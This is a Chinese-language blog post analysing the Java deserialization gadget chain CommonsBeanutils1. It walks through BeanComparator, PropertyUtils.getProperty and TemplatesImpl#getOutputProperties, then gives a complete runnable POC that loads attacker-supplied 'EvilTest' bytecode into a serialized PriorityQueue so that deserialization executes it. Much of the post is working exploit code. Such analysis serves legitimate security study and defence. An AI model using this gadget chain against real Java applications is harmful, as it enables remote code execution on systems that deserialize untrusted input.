# [Java反序列化]Java-CommonsBeanutils1利用链分析




# 前言

Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法

JavaBean就不多说了，搞过一点javaweb开发都知道的，commons-beanutils中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任意JavaBean的getter方法，比如：

```java
PropertyUtils.getProperty(new Cat(), "name");
```



# CB链分析

CB链的触发是在`org.apache.commons.beanutils.BeanComparator`，是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了 java.util.Comparator 接口

我们看一下他的源码，如果property不为null，那么就会执行PropertyUtils.getProperty调用JavaBean的getter方法去获取值来执行internalCompare，跟进internalCompare，会执行compare方法

```java
    public int compare(T o1, T o2) {
        if (this.property == null) {
            return this.internalCompare(o1, o2);
        } else {
            try {
                Object value1 = PropertyUtils.getProperty(o1, this.property);
                Object value2 = PropertyUtils.getProperty(o2, this.property);
                return this.internalCompare(value1, value2);
            } catch (IllegalAccessException var5) {
                throw new RuntimeException("IllegalAccessException: " + var5.toString());
            } catch (InvocationTargetException var6) {
                throw new RuntimeException("InvocationTargetException: " + var6.toString());
            } catch (NoSuchMethodException var7) {
                throw new RuntimeException("NoSuchMethodException: " + var7.toString());
            }
        }
    }



    private int internalCompare(Object val1, Object val2) {
        Comparator c = this.comparator;
        return c.compare(val1, val2);
    }
```

而前面说了`PropertyUtils.getProperty`会自动执行JavaBean的getter方法，而我们的TemplatesImpl的利用链里面，我们之前一直说的是触发`TemplatesImpl#newTransformer()`，但是其实newTransformer上面还有一层：`TemplatesImpl#getOutputProperties()`

![](https://tuchuang.huamang.xyz/img/image-20221006171924771-20221006172100059.png)

这是符合JavaBean的getter的定义的，那么我们就可以连接上CC2链子了

# 利用链构造

首先是创建TemplatesImpl

```java
ClassPool pool = ClassPool.getDefault();
CtClass clazzz = pool.get("EvilTest");
byte[] code = clazzz.toBytecode();
TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][]{code});
setFieldValue(obj, "_name", "HelloTemplatesImpl");
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
```

然后创建BeanComparator和PriorityQueue，因为要把TemplatesImpl对象传入BeanComparator进行比较

所以得把emplatesImpl对象传入传入PriorityQueue的queue

把BeanComparator传入PriorityQueue的comparator

![image-20221006174826308](https://tuchuang.huamang.xyz/img/image-20221006174826308.png)

然后就是CB的核心点，我们得把property传值为`outputProperties`，这样调用getProperty就会触发到`TemplatesImpl#getOutputProperties()`进入到利用链

![image-20221006175351339](https://tuchuang.huamang.xyz/img/image-20221006175351339.png)

```java
BeanComparator comparator = new BeanComparator();
PriorityQueue queue = new PriorityQueue(2, comparator);
// stub data for replacement later
queue.add(1);
queue.add(1);
setFieldValue(comparator, "property", "outputProperties");
setFieldValue(queue, "queue", new Object[]{obj, obj});
```

到这里CB链就构造完成了，下面就可以序列化PriorityQueue对象了

最后的POC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1 {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzz = pool.get("EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```


